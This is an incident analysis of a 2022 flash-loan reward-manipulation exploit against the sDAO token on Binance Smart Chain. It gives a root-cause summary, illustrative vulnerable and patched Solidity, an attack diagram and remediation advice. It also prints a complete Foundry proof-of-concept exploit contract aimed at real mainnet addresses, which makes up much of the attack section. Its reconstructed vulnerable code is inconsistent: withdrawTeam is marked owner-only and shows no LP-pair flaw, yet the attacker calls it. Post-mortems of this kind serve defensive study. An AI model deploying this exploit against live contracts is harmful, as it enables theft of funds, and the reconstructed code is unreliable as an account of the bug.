# sDAO — stakeLP() + withdrawTeam() Reward Manipulation Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2022-11 |
| **Protocol** | sDAO Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed |
| **sDAO Token** | [0x6666625Ab26131B490E7015333F97306F05Bf816](https://bscscan.com/address/0x6666625Ab26131B490E7015333F97306F05Bf816) |
| **USDT** | [0x55d398326f99059fF775485246999027B3197955](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) |
| **LP Pair** | [0x333896437125fF680f146f18c8A164Be831C4C71](https://bscscan.com/address/0x333896437125fF680f146f18c8A164Be831C4C71) |
| **PancakeSwap Router** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **DODO Flash Loan** | [0x26d0c625e5F5D6de034495fbDe1F6e9377185618](https://bscscan.com/address/0x26d0c625e5F5D6de034495fbDe1F6e9377185618) |
| **Root Cause** | sDAO token transfers manipulate the `totalStakeReward` state variable, enabling excess reward extraction via `withdrawTeam()` calls |
| **CWE** | CWE-840: Business Logic Error |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/SDAO_exp.sol) |

---
## 1. Vulnerability Overview

The sDAO token used a fee-on-transfer mechanism that accumulated a portion of each transfer into `totalStakeReward`. The `withdrawTeam()` function was designed to withdraw team rewards based on `totalStakeReward`, but contained a logic error: when called with an LP pair address as the recipient, calculations were based on the `totalStakeReward` balance rather than the pair's reserves. The attacker flash-borrowed 500 USDT from DODO, artificially inflated `totalStakeReward` through a USDT→sDAO swap and LP addition, then called `withdrawTeam(lpPairAddress)` to extract excess sDAO.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable sDAO - totalStakeReward manipulable + withdrawTeam() misuse
contract SDAOToken {
    uint256 public totalStakeReward;
    mapping(address => uint256) private _balances;

    // fee-on-transfer: a portion of each transfer accumulates into totalStakeReward
    function _transfer(address from, address to, uint256 amount) internal {
        uint256 fee = amount * stakeFee / 100;
        totalStakeReward += fee;  // ❌ Can be manipulated via large external transfers
        _balances[from] -= amount;
        _balances[to] += (amount - fee);
    }

    // ❌ withdrawTeam() - malfunctions when called with LP pair address
    function withdrawTeam(address recipient) external onlyOwner {
        // ❌ Logic error when recipient is an LP pair address
        // Allows over-withdrawal based on totalStakeReward
        uint256 reward = totalStakeReward;
        totalStakeReward = 0;
        _transfer(address(this), recipient, reward);
    }

    // getReward() also relies on the same totalStakeReward
    function getReward() external {
        uint256 stakedShare = stakeBalance[msg.sender];
        uint256 reward = totalStakeReward * stakedShare / totalStaked;
        totalStakeReward -= reward;
        _transfer(address(this), msg.sender, reward);
    }
}

// ✅ Correct pattern - defends against totalStakeReward manipulation
contract SafeSDAOToken {
    uint256 private _totalStakeReward;

    // ✅ Snapshot-based reward distribution (ERC20Snapshot pattern)
    function _distributeReward(uint256 fee) internal {
        if (totalStaked == 0) return;
        // Instead of distributing fee immediately, increase rewardPerToken
        rewardPerTokenStored += fee * 1e18 / totalStaked;
    }

    // ✅ withdrawTeam only withdraws protocol revenue
    function withdrawTeam(address recipient) external onlyOwner {
        uint256 protocolFee = _protocolFeeAccumulated;
        _protocolFeeAccumulated = 0;
        _transfer(address(this), recipient, protocolFee);
    }
}
```

---
### On-Chain Source Code

Source: Bytecode decompiled


**SDAO_decompiled.sol** — Entry points:
```solidity
// ❌ Root cause: sDAO token transfers manipulate the `totalStakeReward` state variable, enabling excess reward extraction via `withdrawTeam()` calls
    function withdrawTeam(address arg0) external {}  // 0x3a838636  // ❌ Vulnerability

    function totalStakeReward() external view returns (uint256) {}  // 0x051c9c0c  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash loan 500 USDT from DODO
    │
    ├─[2] Swap USDT → sDAO (PancakeSwap)
    │       sDAO transfer fee → accumulates into totalStakeReward
    │
    ├─[3] Add liquidity with USDT + sDAO
    │       Receive LP tokens
    │
    ├─[4] Stake half of LP tokens (stakeLP)
    │
    ├─[5] Transfer sDAO → further manipulate totalStakeReward
    │       (transfer small amount of sDAO to pair to increase totalStakeReward)
    │
    ├─[6] Call withdrawTeam(lpPairAddress)
    │       ❌ Logic error triggered with LP pair address as target
    │       → Extract excess sDAO based on manipulated totalStakeReward
    │
    ├─[7] Return LP tokens + call getReward() with small LP sDAO
    │       Collect additional rewards
    │
    ├─[8] Swap sDAO → USDT (reverse swap)
    │
    ├─[9] Repay DODO flash loan
    │
    └─[10] Net profit: USDT arbitrage gain
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface ISDAO {
    function stakeLP(uint256 amount) external;
    function withdrawTeam(address recipient) external;
    function getReward() external;
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IDODO {
    function flashLoan(uint256, uint256, address, bytes calldata) external;
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external;
    function addLiquidity(
        address, address, uint256, uint256, uint256, uint256, address, uint256
    ) external returns (uint256, uint256, uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract SDAOExploit is Test {
    ISDAO  sdao   = ISDAO(0x6666625Ab26131B490E7015333F97306F05Bf816);
    IDODO  dodo   = IDODO(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IRouter router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 USDT   = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address pair  = 0x333896437125fF680f146f18c8A164Be831C4C71;

    function setUp() public {
        vm.createSelectFork("bsc", 23_241_440);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDT", USDT.balanceOf(address(this)), 18);
        dodo.flashLoan(500 * 1e18, 0, address(this), "");
        emit log_named_decimal_uint("[End] USDT", USDT.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes calldata) external {
        // [Step 2] Swap USDT → sDAO
        USDT.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(USDT); path[1] = address(sdao);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount / 2, 0, path, address(this), block.timestamp
        );

        // [Step 3] Add liquidity
        sdao.approve(address(router), type(uint256).max);
        router.addLiquidity(
            address(sdao), address(USDT),
            sdao.balanceOf(address(this)), amount / 2,
            0, 0, address(this), block.timestamp
        );

        // [Step 4] Stake half of LP tokens
        IERC20(pair).approve(address(sdao), type(uint256).max);
        sdao.stakeLP(IERC20(pair).balanceOf(address(this)) / 2);

        // [Step 5] Transfer small amount of sDAO to pair → manipulate totalStakeReward
        sdao.transfer(pair, sdao.balanceOf(address(this)));

        // [Step 6] Call withdrawTeam(lpPair) - trigger logic error
        // ⚡ Extract excess sDAO targeting LP pair address
        sdao.withdrawTeam(pair);

        // [Step 7] Call getReward()
        sdao.getReward();

        // [Step 8] Swap sDAO → USDT (reverse swap)
        path[0] = address(sdao); path[1] = address(USDT);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            sdao.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // Repay flash loan
        USDT.transfer(address(dodo), amount);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | fee-on-transfer totalStakeReward manipulation + withdrawTeam() logic error |
| **CWE** | CWE-840: Business Logic Error |
| **OWASP DeFi** | Reward Manipulation Attack |
| **Attack Vector** | Flash loan → mass sDAO transfer (fee accumulation) → `withdrawTeam(lpPair)` logic error |
| **Preconditions** | `totalStakeReward` manipulable via external transfers, `withdrawTeam()` mishandles LP pair addresses |
| **Impact** | Excess sDAO token withdrawal (scale unconfirmed) |

---
## 6. Remediation Recommendations

1. **Defend against totalStakeReward manipulation**: Instead of accumulating token transfer fees directly into `totalStakeReward`, distribute rewards using a `rewardPerToken` approach to prevent manipulation through large transfers.
2. **Input validation for withdrawTeam()**: Explicitly block cases where `recipient` is an LP pair address, and apply a whitelist to allow only designated team addresses.
3. **Caution with fee-on-transfer + AMM combinations**: When using fee-on-transfer tokens with AMMs, reserve/balanceOf discrepancies arise, so all reward calculation logic must be thoroughly reviewed.

---
## 7. Lessons Learned

- **State variable dependency in fee-on-transfer**: The pattern of accumulating transfer fees into a state variable (`totalStakeReward`) allows that state to be manipulated via large transfers. Snapshot-based or `rewardPerToken` approaches are safer than simple accumulation for reward distribution logic.
- **Parameter validation in withdrawTeam()**: Even admin-only functions require input parameter validation. When `recipient` is a special address such as an LP pair, unintended behavior can occur.
- **Sufficiency of small-scale flash loans**: The attack succeeded with a flash loan as small as 500 USDT. Depending on the vulnerability type, attacks are possible without large capital, and flash loan defenses alone are insufficient.